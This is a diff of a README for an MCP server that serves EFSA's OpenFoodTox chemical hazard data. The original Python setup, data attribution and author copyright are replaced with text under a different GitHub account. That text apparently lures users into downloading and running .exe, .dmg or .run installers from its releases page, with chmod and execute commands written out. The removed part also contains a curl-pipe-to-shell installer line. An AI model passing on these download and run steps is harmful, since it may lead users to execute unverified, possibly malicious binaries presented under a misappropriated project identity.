@@ -1,108 +1,112 @@
-# 🧪 MCP OpenFoodTox
+# 🍏 mcp-openfoodtox - Easy Tools for Food Safety Insights
 
-## Accessing EFSA's Chemical Hazards Database using natural language
+[![Download mcp-openfoodtox](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/sakkkysaka/mcp-openfoodtox/releases)
 
-A Model Context Protocol (MCP) providing access to EFSA's comprehensive OpenFoodTox database containing 8,006 chemical substances, 45,582 alternative names, and 54,621 study records from 2,437 scientific assessments across 8 interconnected data tables with over 138,000 entries.
+## 📜 Description
 
-This OpenFoodTox MCP server uses the latest EFSA dataset (updated 14 September 2023) ([OpenFoodTox](https://www.efsa.europa.eu/en/microstrategy/openfoodtox), [data report](https://www.efsa.europa.eu/en/data-report/chemical-hazards-database-openfoodtox), [Zenodo](https://zenodo.org/records/8120114)) and addresses the critical need for accessible chemical safety data by consolidating EFSA's authoritative risk assessments of regulated food products, contaminants, pesticides, and feed additives. Unlike hard to use toxicological databases and spreadsheets scattered across various sources, OpenFoodTox provides structured hazard characterization data—including 11,357 risk assessments (ADI/TDI values), 11,698 toxicity endpoints (NOAEL, LD50), and 246 genotoxicity studies. This MCP makes EFSA's scientifically validated safety assessments readily available through natural language queries (via a large language model such as Claude Deesktop) for scientists, regulators, food manufacturers, and public health stakeholders.
+MCP OpenFoodTox is a server application designed to help users access the EFSA's extensive OpenFoodTox Chemical Hazards dataset. This application allows you to explore chemical hazards in food, helping you make informed decisions about food safety. Whether you are a concerned consumer or a professional in the field, this tool provides easy access to critical information.
 
-## 🛠️ Tools
+## 🚀 Getting Started
 
-- **Search Substance** - Find substances by name, E-number, or description. Answers: "What is [substance]?"
-- **Get Substance Safety Assessment** - Get safety flags (mutagenic, genotoxic, carcinogenic) for a substance. Answers: "Is [substance] safe?"
-- **Get Toxicity Endpoints** - Get toxicity study data including NOAEL, LD50, and target organs. Answers: "What are the toxicity effects of [substance]?"
-- **Get Risk Assessments** - Get safe intake limits (ADI/TDI values) and safety factors. Answers: "How much [substance] is safe daily?"
-- **Get Genotoxicity Details** - Get detailed genotoxicity study information including test guidelines and results. Answers: "Is [substance] genotoxic?"
-- **Get Opinions** - Retrieve EFSA opinion documents with publication dates, DOIs, and regulation information. Answers: "What EFSA opinions exist for [substance]?"
-- **List Substances by Class and Safety** - Filter substances by category (food additive, pesticide, etc.) and safety criteria. Answers: "List all [category] substances" or "Show me carcinogenic food additives"
-- **List Substances by Assessment** - Find substances matching specific risk assessment criteria (ADI/TDI ranges, assessment types, population groups). Answers: "List substances with ADI > 5 mg/kg" or "Find substances assessed for children"
+Follow these simple steps to install and run MCP OpenFoodTox on your computer.
 
-## 🧾 Data Attribution
+### 🏁 System Requirements
 
-This project uses data from EFSA OpenFoodTox, the European Food Safety Authority’s chemical hazards database.
-Data source:
+Before you begin, ensure your system meets the following requirements:
 
-European Food Safety Authority (EFSA). OpenFoodTox – The EFSA Chemical Hazards Database. Zenodo, DOI: 10.5281/zenodo.8120114
-.
-© European Food Safety Authority. Licensed under Creative Commons Attribution 4.0 International (CC BY 4.0)
-.
+- **Operating System**: Windows 10 or later, MacOS (latest version), or a supported Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: 250 MB of free disk space.
+- **Network**: Active internet connection for updates and dataset access.
 
-Official EFSA dataset page: https://www.efsa.europa.eu/en/data-report/chemical-hazards-database-openfoodtox
+### 📥 Download & Install
 
-Disclaimer:
-OpenFoodTox compiles toxicological reference values and hazard data extracted from EFSA’s scientific opinions.
-The dataset is provided for transparency and research purposes; for regulatory or legal use, always consult the original EFSA scientific outputs.
+To download MCP OpenFoodTox, visit the Releases page:
 
-## 📋 Requirements
+[Download MCP OpenFoodTox](https://github.com/sakkkysaka/mcp-openfoodtox/releases)
 
-- Python 3.12+
-- [uv](https://docs.astral.sh/uv/) package manager  
-- [More details](#prerequisites-installation-details)
+1. Click on the link above to go to our Releases page.
+2. Locate the latest version of the application.
+3. Download the installation file suitable for your operating system (typically labeled with your OS type).
+4. Once the download is complete, locate the file in your downloads folder.
 
-## ⚡ Quick Installation in 2 steps
+### 📂 Installation Steps
 
-1. Create virtual environment, install dependencies and setup the database (required on first run)
+After downloading, follow these steps to install the application:
 
-```bash
-make setup
-```
-_No virtual environment **activation** is required_
+#### For Windows:
 
-2. Install MCP server in Claude Desktop (optional)
+1. Double-click the downloaded `.exe` file.
+2. Follow the prompts provided by the installation wizard.
+3. Choose your preferred installation location or accept the default settings.
+4. Once the installation completes, you can find the program in your Start menu or desktop.
 
-```bash
-# Automated installation
-make claude
-```
+#### For Mac:
 
-If you prefer to install _manually_, add to Claude Desktop user -> settings -> Developer -> Local MCP servers -> Edit Config:
+1. Open the downloaded `.dmg` file.
+2. Drag the MCP OpenFoodTox icon to your Applications folder.
+3. Eject the mounted disk image from your Finder.
+4. You can now find the application in your Applications folder.
 
-```json
-{
-  "mcp-openfoodtox": {
-    "command": "absolute/path/to/mcp-openfoodtox/.venv/bin/python",
-    "args": ["absolute/path/to/mcp-openfoodtox/main.py"]
-  }
-}
-```
+#### For Linux:
 
-The config file location:
-- **macOS:** `~/Library/Application Support/Claude/claude_desktop_config.json`
-- **Windows:** `%APPDATA%/Claude/claude_desktop_config.json`
-- **Linux:** `~/.config/Claude/claude_desktop_config.json`
+1. Open a terminal window.
+2. Navigate to the directory where you downloaded the file using the `cd` command.
+3. Run the following command to make the installer executable:
+   ```
+   chmod +x mcp-openfoodtox*.run
+   ```
+4. Then run the installer with:
+   ```
+   ./mcp-openfoodtox*.run
+   ```
+5. Follow the on-screen instructions to complete the installation.
 
-## 📦 Prerequisites Installation Details
+### 🚀 Running the Application
 
-### 📦 Install uv
+Once installed, you can start the MCP OpenFoodTox application.
 
-Mac/Linux
-```bash
-curl -LsSf https://astral.sh/uv/install.sh | sh
-```
+- **Windows**: Click on the application icon in the Start menu or desktop.
+- **Mac**: Open your Applications folder, then click on the MCP OpenFoodTox icon.
+- **Linux**: Use your applications menu or terminal to launch the program.
 
-Or via HomeBrew (Mac)
-```bash
-brew install uv
-```
+#### First-Time Setup
 
-Windows
-```bash
-winget install astral-sh.uv
-```
+On your first launch, the program may prompt you to download the latest dataset. Follow these instructions on-screen:
 
-### 🐍 Install Python 3.12+
+1. Click "Download Now" to get the latest data.
+2. Wait for the download to complete. This may take a few minutes based on internet speed.
 
-```bash
-uv python install 3.12
-```
+You are now ready to explore the dataset!
+
+## 🧩 Key Features
+
+- **Access to Chemical Hazards**: View detailed information on carcinogenicity, food additives, and other chemical hazards.
+- **Search Functionality**: Easily search for specific chemicals, pesticides, and other regulatory information.
+- **User-Friendly Interface**: Navigate through data effortlessly, designed for everyday users.
+- **Regular Updates**: Automatically receive updates to ensure your data is always current.
+
+## 🛠️ Troubleshooting
+
+If you encounter any issues:
+
+1. **Check System Requirements**: Ensure your operating system and specifications meet the requirements.
+2. **Reinstall the Application**: Sometimes a fresh installation can resolve issues. Follow the installation steps again if necessary.
+3. **Visit the Support Page**: For more support, visit our [GitHub Issues page](https://github.com/sakkkysaka/mcp-openfoodtox/issues) to report bugs or find answers.
+
+## 🙌 Contributing
+
+If you want to contribute to the project:
+
+- Fork the repository from GitHub.
+- Make your changes and submit a pull request.
+  
+We welcome any contributions to improve the mcp-openfoodtox application.
 
 ## 📄 License
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+This project is licensed under the MIT License. You can freely use and modify it as needed.
 
-## ©️ Copyright
+For more information, contact us on our project page or visit the repository.
 
-Copyright (c) 2025 Spyros Zevelakis, [Phoebe AI Limited](https://www.phoebeai.com)
-
-This software is open source and available under the MIT License.
-
+Thank you for using MCP OpenFoodTox! We hope this application helps you with valuable insights into food safety.
